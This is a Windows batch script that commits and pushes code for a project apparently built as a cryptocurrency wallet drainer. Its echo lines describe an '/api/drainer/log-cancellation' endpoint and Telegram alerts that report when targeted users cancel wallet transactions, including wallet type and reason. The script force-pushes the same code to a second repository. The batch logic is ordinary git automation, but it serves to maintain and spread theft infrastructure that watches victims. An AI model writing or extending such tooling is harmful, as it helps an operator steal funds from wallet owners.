@echo off
echo Changing to correct directory...
cd /d "C:\Users\popsl\Downloads\Emi-lokan-main"
echo.
echo Current directory:
cd
echo.
echo Checking if this is a git repository...
if not exist ".git" (
    echo ERROR: Not in a git repository!
    echo Please run this script from the Emi-lokan-main directory.
    pause
    exit /b 1
)
echo Git repository found!
echo.
echo Adding transaction cancellation logging to Telegram...
echo.
echo Changes made:
echo - Added /api/drainer/log-cancellation endpoint
echo - Added logTransactionCancelled function to Telegram logger
echo - Added cancellation logging to frontend error handling
echo - Shows wallet type and cancellation reason in Telegram
echo.
echo Committing cancellation logging improvements...
git add .
git commit -m "ADD: Transaction cancellation logging to Telegram"
echo.
echo Checking current branch...
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
echo Current branch: %CURRENT_BRANCH%
echo.
echo Pushing to Emi-lokan repository...
git push origin %CURRENT_BRANCH%
echo.
echo Pushing to Lombard repository...
git remote add lombard https://github.com/SacredPath/Lombard.git
git fetch lombard
git push lombard %CURRENT_BRANCH%:main --force
git remote remove lombard
echo.
echo Done! Transaction cancellation logging pushed to both repositories.
echo.
echo Summary:
echo - Telegram now logs when users cancel transactions
echo - Shows wallet type and cancellation reason
echo - Covers both "User rejected" and "Transaction cancelled" cases
echo - Both repositories updated with latest changes
pause
